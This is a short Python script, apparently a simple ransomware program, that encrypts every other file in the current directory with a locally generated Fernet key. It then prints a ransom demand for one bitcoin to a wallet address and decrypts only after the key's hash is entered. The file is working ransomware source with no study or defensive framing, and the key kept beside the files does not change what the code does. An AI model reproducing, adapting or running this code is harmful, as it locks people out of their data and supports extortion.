import os
import hashlib
from cryptography.fernet import Fernet
from pathlib import Path

KEY_FILE = "decrypt.key"
HASH_FILE = "unlock.hash"
files = [
    file for file in os.listdir()
    if os.path.isfile(file) and file not in ("ransomware.py", KEY_FILE, HASH_FILE)
]
def load_key():
    with open(KEY_FILE, "rb") as kf:
        return kf.read()

def encrypt():
    key = load_key()
    fernet = Fernet(key)

    for file in files:
        with open(file, "rb") as thefile:
            data = thefile.read()
        encrypted = fernet.encrypt(data)
        with open(file, "wb") as thefile:
            thefile.write(encrypted)

    print(f"ALL FILES IN {Path.cwd()} ARE ENCRYPTED!\n"
          f"SEND 1 BITCOIN TO THIS WALLET ADDRESS: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy")
    
def decrypt():
    key = load_key()
    fernet = Fernet(key)

    for file in files:
        with open(file, "rb") as thefile:
            data = thefile.read()
        decrypted = fernet.decrypt(data)
        with open(file, "wb") as thefile:
            thefile.write(decrypted)

    print(f"ALL FILES IN {Path.cwd()} ARE DECRYPTED!")

def main():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as keyfile:
            keyfile.write(key)
        key_hash = hashlib.sha256(key).hexdigest()
        with open(HASH_FILE, "w") as hashfile:
            hashfile.write(key_hash)
        encrypt()
    with open(HASH_FILE, "r") as hf:
        correct_hash = hf.read().strip()
    unlock = input("\nENTER THE HASH FILE TO DECRYPT: ").strip()

    if unlock == correct_hash:
        print("[+] UNLOCK SUCCESSFUL!")
        decrypt()
        os.remove(HASH_FILE)
        os.remove(KEY_FILE)
    else:
        print("[!] WRONG KEY! DECRYPTION DENIED!")

if __name__ == "__main__":
    main()
